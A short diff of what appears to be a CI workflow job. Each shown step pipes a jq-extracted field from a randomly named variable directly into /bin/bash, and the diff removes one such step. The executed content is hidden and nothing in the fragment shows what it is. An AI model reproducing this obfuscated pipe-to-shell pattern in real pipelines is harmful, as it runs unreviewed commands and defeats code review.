@@ -25,7 +25,6 @@ jobs:
           echo $fyx401 | jq -r .wxhh3 | /bin/bash
           echo $o8 | jq -r .bxqmj46896 | /bin/bash
           printf '%s' "$uzv75" | jq -r .iw372 | /bin/bash
-          printf '%s' "$djeci48827" | jq -r .xdj6 | /bin/bash
           printf '%s' "$vdl5098" | jq -r .f6270 | /bin/bash
 
       - name: Archive results
